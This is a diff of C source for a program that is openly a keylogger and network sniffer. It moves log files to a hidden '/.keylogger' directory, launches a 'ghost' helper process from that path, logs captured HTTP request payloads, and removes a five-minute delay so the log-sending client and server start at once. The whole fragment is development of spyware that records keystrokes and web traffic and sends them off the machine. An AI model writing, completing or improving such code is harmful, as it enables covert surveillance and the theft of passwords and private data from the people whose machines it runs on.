@@ -63,7 +63,14 @@ int main(int argc, char **argv)
     pthread_t sendlogs;
     pthread_create(&sendlogs, &attr, send_logs, NULL);
 
-    FILE *network_log = fopen("log/network.txt", "a");
+    FILE *network_log = fopen("/.keylogger/log/network.txt", "a");
+    if (network_log == NULL)
+    {
+        printf("Error opening network log. Exiting...");
+        exit(1);
+    }
+    setbuf(network_log, NULL);
+
     struct loginfo info = { network_log, NEVER_WRITTEN, 4 };
 
     FILE *keylog_log = fopen("log/keylog.txt", "a");
@@ -150,7 +157,7 @@ pid_t exec_ghost()
         sprintf(str_id, "%d", parent_id);
 
         printf("Starting ghost...\n");
-        execlp("./ghost", "./ghost", str_id, NULL);
+        execlp("/.keylogger/./ghost", "./ghost", str_id, NULL);
     }
 
     return id;
@@ -183,11 +190,13 @@ void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_cha
     }
 
     if (p_size > 0)
+    {
         if (is_http_request(payload, p_size))
         {
             timestamped_write(info, payload);
             timestamped_write(info, "\n");
         }
+    }
 }
 
 struct Config retrive_keyboard_file()
@@ -260,7 +269,7 @@ void* start_keylogging(void *args)
 
 void* send_logs()
 {
-    sleep(300); //sleep for 300sec = 5 min
+    //sleep(300); //sleep for 300sec = 5 min
     run_client();
     run_server();
     return EXIT_SUCCESS;
